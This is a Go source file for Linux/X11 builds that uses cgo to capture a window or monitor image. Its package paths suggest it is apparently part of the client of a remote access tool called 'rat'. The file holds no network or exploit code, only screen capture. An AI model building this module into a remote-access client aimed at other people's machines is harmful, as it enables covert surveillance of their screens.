//+build !windows,!darwin

package screen

/*
#cgo LDFLAGS: -lX11 -lXrandr
#include <stdlib.h>
#include "screen.h"
#include "screen_x11.h"
*/
import "C"

import (
	"image"
	"rat/client/log"
	"rat/shared"
	"unsafe"
)

func CaptureWindow(handle int) image.Image {
	if handle == 0 {
		return nil
	}

	cap := C.CaptureWindow(C.int(handle))

	if int(cap.error) != 0 || cap.image == nil {
		log.Errorln("capturing window %d failed: %d", handle, int(cap.error))
		return nil
	}

	defer C.DestroyImage(cap)
	return handleImage(cap)
}

func Capture(monitor shared.Monitor) image.Image {
	m := cMonitor(monitor)

	image := C.CaptureMonitor(m)

	defer C.DestroyImage(image)
	return handleImage(image)
}

func handleImage(cap C.Capture) image.Image {
	width := int(cap.width)
	height := int(cap.height)

	len := width * height * 4
	buf := C.GoBytes(unsafe.Pointer(cap.image.data), C.int(len))

	return imageFromBitmap(buf, width, height)
}
